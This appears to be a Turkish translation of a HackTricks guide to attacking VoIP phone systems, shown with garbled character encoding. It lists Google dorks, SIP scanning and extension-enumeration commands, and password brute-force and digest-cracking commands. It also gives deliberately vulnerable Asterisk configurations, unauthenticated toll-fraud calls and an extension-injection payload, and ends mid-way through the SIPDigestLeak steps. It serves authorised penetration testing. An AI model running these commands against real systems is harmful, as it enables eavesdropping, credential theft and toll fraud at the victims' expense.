# VoIP Pentesting

<details>

<summary><strong>AWS hackleme hakkÄ±nda sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi **HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## VoIP Temel Bilgiler

VoIP'nin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± Ã¶ÄŸrenmeye baÅŸlamak iÃ§in kontrol edin:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## VoIP NumaralarÄ±nÄ±n SaptanmasÄ±

KÄ±rmÄ±zÄ± TakÄ±m'Ä±n yapabileceÄŸi ilk adÄ±mlardan biri, OSINT araÃ§larÄ±, Google AramalarÄ± veya web sayfalarÄ±nÄ± kazÄ±yarak ÅŸirketle iletiÅŸim kurmak iÃ§in kullanÄ±labilir telefon numaralarÄ±nÄ± aramaktÄ±r.

Telefon numaralarÄ±na sahip olduktan sonra, operatÃ¶rÃ¼ belirlemek iÃ§in Ã§evrimiÃ§i hizmetler kullanabilirsiniz:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

OperatÃ¶rÃ¼n VoIP hizmeti saÄŸlayÄ±p saÄŸlamadÄ±ÄŸÄ±nÄ± bilmek, ÅŸirketin VoIP kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± belirlemenizi saÄŸlar... DahasÄ±, ÅŸirketin VoIP PBX'ini geleneksel telefon aÄŸÄ±na baÄŸlamak iÃ§in PSTN kartlarÄ± kullanmadÄ±ÄŸÄ± halde VoIP hizmeti satÄ±n almadÄ±ÄŸÄ± olabilir.

MÃ¼zik veya otomatik yanÄ±tlar gibi ÅŸeyler genellikle VoIP kullanÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶sterir.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT bilgileri

VoIP yazÄ±lÄ±mÄ±nÄ±n tespit edilmesine yardÄ±mcÄ± olan diÄŸer OSINT araÅŸtÄ±rmalarÄ± KÄ±rmÄ±zÄ± TakÄ±m iÃ§in faydalÄ± olacaktÄ±r.

### AÄŸ TaramasÄ±

* **`nmap`**, UDP servislerini tarama yeteneÄŸine sahiptir, ancak tarama yapÄ±lan UDP servislerinin sayÄ±sÄ± nedeniyle oldukÃ§a yavaÅŸ olabilir ve bu tÃ¼r servislerle Ã§ok doÄŸru sonuÃ§lar vermeyebilir.
* SIPVicious'ten **`svmap`** (`sudo apt install sipvicious`): Belirtilen aÄŸda SIP servislerini bulacaktÄ±r.
* `svmap`, `friendly-scanner` kullanÄ±cÄ± ajanÄ±nÄ± kullandÄ±ÄŸÄ± iÃ§in **kolayca engellenebilir**, ancak `/usr/share/sipvicious/sipvicious` dizinindeki kodu deÄŸiÅŸtirerek bunu deÄŸiÅŸtirebilirsiniz.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`** [**sippts**](https://github.com/Pepelux/sippts)**'den:** Sipscan, UDP, TCP veya TLS Ã¼zerinden SIP hizmetlerini taramak iÃ§in Ã§ok hÄ±zlÄ± bir tarayÄ±cÄ±dÄ±r. Ã‡oklu iÅŸ parÃ§acÄ±ÄŸÄ± kullanÄ±r ve geniÅŸ aÄŸ aralÄ±klarÄ±nÄ± tarayabilir. Kolayca bir port aralÄ±ÄŸÄ± belirtmeye, hem TCP hem de UDP'yi taramaya, baÅŸka bir yÃ¶ntem kullanmaya (varsayÄ±lan olarak OPTIONS kullanÄ±r) ve farklÄ± bir User-Agent belirtmeye (ve daha fazlasÄ±na) izin verir.
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**:

Metasploit, birÃ§ok farklÄ± gÃ¼venlik aÃ§Ä±ÄŸÄ± tespit etme ve istismar etme yeteneklerine sahip bir popÃ¼ler bir aÃ§Ä±k kaynaklÄ± sÄ±zma testi aracÄ±dÄ±r. Metasploit Framework, siber gÃ¼venlik profesyonellerinin aÄŸlarÄ±, uygulamalarÄ± ve sistemleri test etmek ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmek iÃ§in kullanabilecekleri bir dizi modÃ¼l ve araÃ§ sunar. Bu araÃ§, hedef sistemlere saldÄ±rmak ve zafiyetlerini istismar etmek iÃ§in kullanÄ±labilir. Metasploit, sÄ±zma testi ve gÃ¼venlik deÄŸerlendirmeleri sÄ±rasÄ±nda yaygÄ±n olarak kullanÄ±lan bir araÃ§tÄ±r.
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Ekstra AÄŸ NumaralandÄ±rma

PBX ayrÄ±ca aÅŸaÄŸÄ±daki gibi diÄŸer aÄŸ hizmetlerini de aÃ§Ä±ÄŸa Ã§Ä±karabilir:

* **69/UDP (TFTP)**: Firmware gÃ¼ncellemeleri
* **80 (HTTP) / 443 (HTTPS)**: CihazÄ± web Ã¼zerinden yÃ¶netmek iÃ§in
* **389 (LDAP)**: KullanÄ±cÄ± bilgilerini depolamak iÃ§in alternatif
* **3306 (MySQL**): MySQL veritabanÄ±
* **5038 (Manager)**: Asterisk'i diÄŸer platformlardan kullanmaya izin verir
* **5222 (XMPP)**: Jabber kullanarak mesajlar
* **5432 (PostgreSQL)**: PostgreSQL veritabanÄ±
* Ve diÄŸerleri...

### YÃ¶ntemlerin NumaralandÄ±rÄ±lmasÄ±

PBX'de kullanÄ±labilecek **hangi yÃ¶ntemlerin mevcut olduÄŸu** `sipenumerate.py` kullanÄ±larak bulunabilir. [**sippts**](https://github.com/Pepelux/sippts)
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### UzantÄ± NumaralarÄ±nÄ±n SaptanmasÄ±

PBX (Ã–zel Åube DeÄŸiÅŸtirici) sistemlerinde uzantÄ±lar, bir organizasyon veya iÅŸletme iÃ§indeki bireysel telefon hatlarÄ±, cihazlar veya kullanÄ±cÄ±lara atanan **benzersiz iÃ§ tanÄ±mlayÄ±cÄ±lardÄ±r**. UzantÄ±lar, her kullanÄ±cÄ± veya cihaz iÃ§in ayrÄ± harici telefon numaralarÄ±na ihtiyaÃ§ duymadan, **organizasyon iÃ§inde Ã§aÄŸrÄ±larÄ± verimli bir ÅŸekilde yÃ¶nlendirmeyi mÃ¼mkÃ¼n kÄ±lar**.

* **SIPVicious'ten `svwar`** (`sudo apt install sipvicious`): `svwar`, Ã¼cretsiz bir SIP PBX uzantÄ± hattÄ± tarayÄ±cÄ±sÄ±dÄ±r. Kavramsal olarak, geleneksel wardialer'lar gibi Ã§alÄ±ÅŸÄ±r ve **bir uzantÄ± aralÄ±ÄŸÄ± veya belirli bir uzantÄ± listesi tahmin ederek** Ã§alÄ±ÅŸÄ±r.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`** [**sippts**](https://github.com/Pepelux/sippts) Ã¼zerinden: Sipexten, bir SIP sunucusunda uzantÄ±larÄ± tanÄ±mlar. Sipexten, geniÅŸ aÄŸ ve port aralÄ±klarÄ±nÄ± kontrol edebilir.
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: Metasploit ile uzantÄ±larÄ±/kullanÄ±cÄ± adlarÄ±nÄ± da sÄ±ralayabilirsiniz:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** bir Inter Asterisk Exchange protokolÃ¼ **kullanÄ±cÄ± adÄ± brute-force numaralandÄ±rÄ±cÄ±sÄ±**dÄ±r. enumIAX iki farklÄ± modda Ã§alÄ±ÅŸabilir; SÄ±ralÄ± KullanÄ±cÄ± AdÄ± Tahmini veya SÃ¶zlÃ¼k SaldÄ±rÄ±sÄ±.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP SaldÄ±rÄ±larÄ±

### Åifre Brute-Force

Bir KÄ±rmÄ±zÄ± TakÄ±m, **PBX**'i ve bazÄ± **uzantÄ±/kullanÄ±cÄ± adlarÄ±nÄ±** keÅŸfettikten sonra, bir sÃ¶zlÃ¼k kullanarak kimlik doÄŸrulamasÄ± iÃ§in bir uzantÄ±ya `REGISTER` yÃ¶ntemi aracÄ±lÄ±ÄŸÄ±yla **kimlik doÄŸrulama yapmayÄ±** deneyebilir.

{% hint style="danger" %}
Bir **kullanÄ±cÄ± adÄ±nÄ±n** uzantÄ± ile aynÄ± olabileceÄŸini unutmayÄ±n, ancak bu uygulama PBX sistemi, yapÄ±landÄ±rmasÄ± ve kuruluÅŸun tercihlerine baÄŸlÄ± olarak deÄŸiÅŸebilir...

EÄŸer kullanÄ±cÄ± adÄ± uzantÄ± ile aynÄ± deÄŸilse, kullanÄ±cÄ± adÄ±nÄ± **bulmak iÃ§in brute-force yapmanÄ±z gerekecektir**.
{% endhint %}

* **`svcrack`** from SIPVicious (`sudo apt install sipvicious`): SVCrack, bir PBX Ã¼zerinde belirli bir kullanÄ±cÄ± adÄ±/uzantÄ± iÃ§in ÅŸifreyi kÄ±rmak iÃ§in kullanÄ±lÄ±r.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`** [**sippts**](https://github.com/Pepelux/sippts) iÃ§erisinden:** SIP Digest Crack, SIP protokolÃ¼ iÃ§indeki digest kimlik doÄŸrulamalarÄ±nÄ± kÄ±rmak iÃ§in bir araÃ§tÄ±r.

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP Sniffing

EÄŸer bir **AÃ§Ä±k Wifi aÄŸÄ±** iÃ§inde VoIP ekipmanÄ± bulursanÄ±z, **tÃ¼m bilgileri dinleyebilirsiniz**. DahasÄ±, daha kapalÄ± bir aÄŸda bulunuyorsanÄ±z (Ethernet veya korumalÄ± Wifi Ã¼zerinden baÄŸlanmÄ±ÅŸ), **ARPspoofing** gibi **MitM saldÄ±rÄ±larÄ±** gerÃ§ekleÅŸtirebilir ve bilgileri dinleyebilirsiniz.

AÄŸ bilgileri arasÄ±nda, ekipmanÄ± yÃ¶netmek iÃ§in kullanÄ±lan **web kimlik bilgileri**, kullanÄ±cÄ± **uzantÄ±larÄ±**, **kullanÄ±cÄ± adÄ±**, **IP** adresleri, hatta **karmaÅŸÄ±k parolalar** ve **RTP paketleri** bulunabilir. Bu RTP paketlerini Ã§oÄŸaltarak **konuÅŸmayÄ± dinleyebilirsiniz** ve daha fazlasÄ±nÄ± yapabilirsiniz.

Bu bilgilere ulaÅŸmak iÃ§in Wireshark, tcpdump gibi araÃ§larÄ± kullanabilirsiniz, ancak VoIP konuÅŸmalarÄ±nÄ± dinlemek iÃ§in Ã¶zel olarak oluÅŸturulmuÅŸ bir araÃ§ olan [**ucsniff**](https://github.com/Seabreg/ucsniff) kullanabilirsiniz.

{% hint style="danger" %}
**SIP iletiÅŸiminde TLS kullanÄ±lÄ±yorsa**, SIP iletiÅŸimini aÃ§Ä±k bir ÅŸekilde gÃ¶remezsiniz.\
AynÄ± durum **SRTP** ve **ZRTP** kullanÄ±lÄ±yorsa, **RTP paketleri aÃ§Ä±k metin olmayacaktÄ±r**.
{% endhint %}

#### SIP kimlik bilgileri

**SIP REGISTER iletiÅŸimini daha iyi anlamak iÃ§in bu Ã¶rneÄŸi kontrol edin** ve **kimlik bilgilerinin nasÄ±l gÃ¶nderildiÄŸini** Ã¶ÄŸrenin.

* **`sipdump`** & **`sipcrack`,** **sipcrack**'in bir parÃ§asÄ± (`apt-get install sipcrack`): Bu araÃ§lar, bir **pcap** iÃ§indeki SIP protokolÃ¼ iÃ§indeki **digest kimlik doÄŸrulamalarÄ±nÄ±** Ã§Ä±karabilir ve **brute force** yapabilir.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** [**sippts**](https://github.com/Pepelux/sippts)**'den:**
* **SipTshark**, bir PCAP dosyasÄ±ndan SIP protokolÃ¼ verilerini Ã§Ä±karÄ±r.
* **SipDump**, bir PCAP dosyasÄ±ndan SIP Digest kimlik doÄŸrulamalarÄ±nÄ± Ã§Ä±karÄ±r.
* **SIP Digest Crack**, SIP protokolÃ¼ iÃ§indeki digest kimlik doÄŸrulamalarÄ±nÄ± kÄ±rmak iÃ§in bir araÃ§tÄ±r.
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### DTMF kodlarÄ±

AÄŸ trafiÄŸinde **yalnÄ±zca SIP kimlik bilgileri** deÄŸil, aynÄ± zamanda Ã¶rneÄŸin **sesli mesaj**e eriÅŸmek iÃ§in kullanÄ±lan DTMF kodlarÄ± da bulunabilir.\
Bu kodlarÄ± **INFO SIP mesajlarÄ±**, **ses** veya **RTP paketleri** iÃ§inde gÃ¶ndermek mÃ¼mkÃ¼ndÃ¼r. Kodlar RTP paketlerinin iÃ§indeyse, konuÅŸmanÄ±n o kÄ±smÄ±nÄ± kesip multimo aracÄ±nÄ± kullanarak onlarÄ± Ã§Ä±karabilirsiniz:
```bash
multimon -a DTMF -t wac pin.wav
```
### Ãœcretsiz Aramalar / Asterisk BaÄŸlantÄ± HatalarÄ±

Asterisk'te, bir baÄŸlantÄ±ya **belirli bir IP adresinden** veya **herhangi bir IP adresinden** izin vermek mÃ¼mkÃ¼ndÃ¼r:
```
host=10.10.10.10
host=dynamic
```
EÄŸer bir IP adresi belirtilirse, **sunucunun REGISTER** isteklerini belirli aralÄ±klarla gÃ¶ndermesine gerek kalmaz (REGISTER paketinde genellikle 30 dakika olan yaÅŸam sÃ¼resi gÃ¶nderilir, bu da diÄŸer senaryoda telefonun her 30 dakikada bir REGISTER yapmasÄ±nÄ± gerektirir). Bununla birlikte, VoIP sunucusundan gelen Ã§aÄŸrÄ±larÄ± almak iÃ§in aÃ§Ä±k portlara sahip olmasÄ± gerekecektir.

KullanÄ±cÄ±larÄ± tanÄ±mlamak iÃ§in aÅŸaÄŸÄ±daki ÅŸekilde tanÄ±mlanabilirler:

* **`type=user`**: KullanÄ±cÄ± sadece kullanÄ±cÄ± olarak Ã§aÄŸrÄ± alabilir.
* **`type=friend`**: UzantÄ±larla birlikte Ã§aÄŸrÄ± yapmak ve kullanÄ±cÄ± olarak Ã§aÄŸrÄ± almak mÃ¼mkÃ¼ndÃ¼r.
* **`type=peer`**: SIP-trunklarla Ã§aÄŸrÄ± gÃ¶ndermek ve almak mÃ¼mkÃ¼ndÃ¼r.

AyrÄ±ca, gÃ¼vensiz deÄŸiÅŸkenle gÃ¼ven oluÅŸturmak da mÃ¼mkÃ¼ndÃ¼r:

* **`insecure=port`**: IP tarafÄ±ndan doÄŸrulanan peer baÄŸlantÄ±larÄ±na izin verir.
* **`insecure=invite`**: INVITE mesajlarÄ± iÃ§in kimlik doÄŸrulama gerektirmez.
* **`insecure=port,invite`**: Her ikisi de

{% hint style="warning" %}
**`type=friend`** kullanÄ±ldÄ±ÄŸÄ±nda, **host** deÄŸiÅŸkeninin **deÄŸeri kullanÄ±lmaz**, bu nedenle bir yÃ¶netici bu deÄŸeri kullanarak bir SIP-trunk'Ä± yanlÄ±ÅŸ yapÄ±landÄ±rÄ±rsa, **herkes ona baÄŸlanabilir**.

Ã–rneÄŸin, bu yapÄ±landÄ±rma savunmasÄ±z olacaktÄ±r:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Ãœcretsiz Aramalar / Asterisk BaÄŸlam YanlÄ±ÅŸ YapÄ±landÄ±rmalarÄ±

Asterisk'te bir **baÄŸlam**, ilgili uzantÄ±larÄ±, eylemleri ve kurallarÄ± **gruplandÄ±ran adlandÄ±rÄ±lmÄ±ÅŸ bir konteyner veya bÃ¶lÃ¼mdÃ¼r**. Arama planÄ±, bir Asterisk sisteminin temel bileÅŸenidir, Ã§Ã¼nkÃ¼ **gelen ve giden Ã§aÄŸrÄ±larÄ±n nasÄ±l iÅŸlendiÄŸini ve yÃ¶nlendirildiÄŸini** tanÄ±mlar. BaÄŸlamlar, arama planÄ±nÄ± dÃ¼zenlemek, eriÅŸim kontrolÃ¼nÃ¼ yÃ¶netmek ve sistemdeki farklÄ± bÃ¶lÃ¼mler arasÄ±nda ayrÄ±m saÄŸlamak iÃ§in kullanÄ±lÄ±r.

Her baÄŸlam genellikle **`extensions.conf`** dosyasÄ±nda yapÄ±landÄ±rma dosyasÄ±nda tanÄ±mlanÄ±r. BaÄŸlamlar, kÃ¶ÅŸeli parantezlerle belirtilir ve baÄŸlam adÄ± iÃ§ine alÄ±nÄ±r. Ã–rneÄŸin:
```bash
csharpCopy code[my_context]
```
Ä°Ã§erikte, uzantÄ±larÄ± (aranan numaralarÄ±n desenlerini) tanÄ±mlarsÄ±nÄ±z ve bunlarÄ± bir dizi eylem veya uygulama ile iliÅŸkilendirirsiniz. Bu eylemler, aramanÄ±n nasÄ±l iÅŸlendiÄŸini belirler. Ã–rneÄŸin:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Bu Ã¶rnek, "my\_context" adÄ±nda basit bir baÄŸlamÄ± ve "100" uzantÄ±sÄ±nÄ± gÃ¶stermektedir. Birisi 100'Ã¼ Ã§evirdiÄŸinde, Ã§aÄŸrÄ± cevaplanacak, bir karÅŸÄ±lama mesajÄ± Ã§alÄ±nacak ve ardÄ±ndan Ã§aÄŸrÄ± sonlandÄ±rÄ±lacaktÄ±r.

Bu, **baÅŸka bir numarayÄ± aramaya izin veren baÅŸka bir baÄŸlamdÄ±r**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
EÄŸer yÃ¶netici **varsayÄ±lan baÄŸlamÄ±** aÅŸaÄŸÄ±daki gibi tanÄ±mlarsa:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Herhangi bir kiÅŸi, **sunucuyu baÅŸka bir numarayÄ± aramak iÃ§in kullanabilecek** (ve sunucu yÃ¶neticisi aramayÄ± Ã¶deyecektir).
{% endhint %}

{% hint style="danger" %}
AyrÄ±ca, varsayÄ±lan olarak **`sip.conf`** dosyasÄ± **`allowguest=true`** iÃ§erir, bu durumda **herhangi bir** kimlik doÄŸrulama olmadan saldÄ±rgan herhangi bir numarayÄ± arayabilir.
{% endhint %}

*   [**sippts**](https://github.com/Pepelux/sippts) 'den **`sipinvite.py`**:** Sipinvite, bir **PBX sunucusunun kimlik doÄŸrulama olmadan arama yapmamÄ±za izin verip vermediÄŸini** kontrol eder. EÄŸer SIP sunucusu yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, harici numaralara arama yapmamÄ±za izin verecektir. AyrÄ±ca Ã§aÄŸrÄ±yÄ± ikinci bir harici numaraya aktarmamÄ±za da izin verebilir.

Ã–rneÄŸin, Asterisk sunucunuzun kÃ¶tÃ¼ bir baÄŸlam yapÄ±landÄ±rmasÄ± varsa, yetkilendirme olmadan INVITE isteÄŸini kabul edebilirsiniz. Bu durumda, bir saldÄ±rgan herhangi bir kullanÄ±cÄ±/ÅŸifre bilgisi olmadan arama yapabilir.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Ãœcretsiz aramalar / YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ IVRS

IVRS, kullanÄ±cÄ±larÄ±n ses veya dokunmatik tuÅŸ giriÅŸleri aracÄ±lÄ±ÄŸÄ±yla bilgisayarlaÅŸtÄ±rÄ±lmÄ±ÅŸ bir sistemle etkileÅŸimde bulunmasÄ±nÄ± saÄŸlayan bir telefon teknolojisidir. IVRS, bilgi saÄŸlama, Ã§aÄŸrÄ± yÃ¶nlendirme ve kullanÄ±cÄ± giriÅŸi yakalama gibi Ã§eÅŸitli iÅŸlevler sunan **otomatik Ã§aÄŸrÄ± iÅŸleme** sistemleri oluÅŸturmak iÃ§in kullanÄ±lÄ±r.

VoIP sistemlerinde IVRS genellikle ÅŸunlardan oluÅŸur:

1. **Sesli ipuÃ§larÄ±**: KullanÄ±cÄ±larÄ± IVR menÃ¼ seÃ§enekleri ve talimatlarÄ±yla yÃ¶nlendiren Ã¶nceden kaydedilmiÅŸ sesli mesajlar.
2. **DTMF** (Dual-Tone Multi-Frequency) sinyali: Telefon Ã¼zerindeki tuÅŸlara basarak oluÅŸturulan dokunmatik tuÅŸ giriÅŸleri, IVR menÃ¼lerinde gezinmek ve giriÅŸ saÄŸlamak iÃ§in kullanÄ±lÄ±r.
3. **Ã‡aÄŸrÄ± yÃ¶nlendirme**: KullanÄ±cÄ± giriÅŸine baÄŸlÄ± olarak Ã§aÄŸrÄ±larÄ± belirli departmanlara, temsilcilere veya uzantÄ±lara yÃ¶nlendirme.
4. **KullanÄ±cÄ± giriÅŸi yakalama**: Hesap numaralarÄ±, vaka kimlikleri veya diÄŸer ilgili veriler gibi Ã§aÄŸrÄ± yapanlardan bilgi toplama.
5. **Harici sistemlerle entegrasyon**: IVR sisteminin veritabanlarÄ±na veya diÄŸer yazÄ±lÄ±m sistemlerine baÄŸlanarak bilgiye eriÅŸme veya gÃ¼ncelleme, iÅŸlemler gerÃ§ekleÅŸtirme veya olaylarÄ± tetikleme.

Asterisk VoIP sisteminde, IVR'yi **`extensions.conf`** dosyasÄ± ve `Background()`, `Playback()`, `Read()` gibi Ã§eÅŸitli uygulamalar kullanarak oluÅŸturabilirsiniz. Bu uygulamalar, sesli ipuÃ§larÄ± Ã§almaya, kullanÄ±cÄ± giriÅŸi yakalamaya ve Ã§aÄŸrÄ± akÄ±ÅŸÄ±nÄ± kontrol etmeye yardÄ±mcÄ± olur.

#### SavunmasÄ±z yapÄ±landÄ±rmanÄ±n Ã¶rneÄŸi
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Ã–nceki Ã¶rnek, kullanÄ±cÄ±nÄ±n bir departmanÄ± aramak iÃ§in **1'i tuÅŸlamasÄ±nÄ±**, baÅŸka bir departmanÄ± aramak iÃ§in **2'yi tuÅŸlamasÄ±nÄ±** veya **uzantÄ± numarasÄ±nÄ±** biliyorsa tam numarayÄ± girmesini istediÄŸi durumu gÃ¶stermektedir.\
Bu zafiyet, belirtilen **uzantÄ± uzunluÄŸunun kontrol edilmemesidir, bu nedenle bir kullanÄ±cÄ± 5 saniyelik zaman aÅŸÄ±mÄ± sÃ¼resi iÃ§inde tam bir numara girebilir ve arama gerÃ§ekleÅŸir.**

### UzantÄ± Enjeksiyonu

AÅŸaÄŸÄ±daki gibi bir uzantÄ± kullanarak:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
**`${EXTEN}`** deÄŸiÅŸkeni, Ã§aÄŸrÄ±lacak olan **dahili numarayÄ±** temsil etmektedir. **ext 101** girildiÄŸinde, aÅŸaÄŸÄ±daki durum gerÃ§ekleÅŸecektir:
```scss
exten => 101,1,Dial(SIP/101)
```
Ancak, **`${EXTEN}`** daha Ã¶nceki Asterisk sÃ¼rÃ¼mlerinde olduÄŸu gibi **sayÄ±lardan baÅŸka karakterlerin** de girilmesine izin veriyorsa, bir saldÄ±rgan **`101&SIP123123123`** girerek 123123123 telefon numarasÄ±nÄ± arayabilir. Ve bu sonuÃ§ olurdu:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Bu nedenle, **`101`** ve **`123123123`** uzantÄ±sÄ±na yapÄ±lan bir Ã§aÄŸrÄ± gÃ¶nderilecek ve sadece ilk Ã§aÄŸrÄ± alan baÄŸlantÄ± kurulacak... ancak bir saldÄ±rgan, gerÃ§ekleÅŸtirilen herhangi bir eÅŸleÅŸtirmeyi atlayan bir **uzantÄ± kullanÄ±rsa** ve mevcut olmasa bile, yalnÄ±zca istenen numaraya bir Ã§aÄŸrÄ± **enjekte edebilir**.

## SIPDigestLeak

SIP Digest Leak, donanÄ±m ve yazÄ±lÄ±m IP TelefonlarÄ± ile telefon adaptÃ¶rlerini (VoIP'ten analog'a) iÃ§eren birÃ§ok SIP Telefonu etkileyen bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, ÅŸifreden hesaplanan Digest kimlik doÄŸrulama yanÄ±tÄ±nÄ±n **sÄ±zmasÄ±na izin verir**. ArdÄ±ndan, Ã§oÄŸu ÅŸifreyi meydan okuma yanÄ±tÄ±na dayanarak gerÃ§ekleÅŸtirebilen bir **Ã§evrimdÄ±ÅŸÄ± ÅŸifre saldÄ±rÄ±sÄ± mÃ¼mkÃ¼ndÃ¼r**.

**[Buradan gÃ¼venlik aÃ§Ä±ÄŸÄ± senaryosu**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)**na ulaÅŸabilirsiniz**:

1. Bir IP Telefonu (kurban), telefon Ã§aÄŸrÄ±larÄ±nÄ± kabul ederek 5060 numaralÄ± baÄŸlantÄ± noktasÄ±nda dinleme yapar.
2. SaldÄ±rgan, IP Telefonuna bir INVITE gÃ¶nderir.
3. Kurban telefon Ã§almaya baÅŸlar ve biri telefonu aÃ§ar ve kapatÄ±r (Ã§Ã¼nkÃ¼ diÄŸer ucunda kimse telefonu aÃ§maz)
4. Telefon kapatÄ±ldÄ±ÄŸÄ±nda, **kurban telefon saldÄ±rana bir BYE gÃ¶nderir**.
5. **SaldÄ±rgan, kimlik doÄŸrulamasÄ± isteyen bir 407 yanÄ±tÄ±** yayÄ±nlar ve bir kimlik doÄŸrulama meydan okumasÄ± oluÅŸturur.
6. **Kurban telefon, ikinci bir BYE ile kimlik doÄŸrulama meydan okumasÄ±na bir yanÄ±t saÄŸlar**.
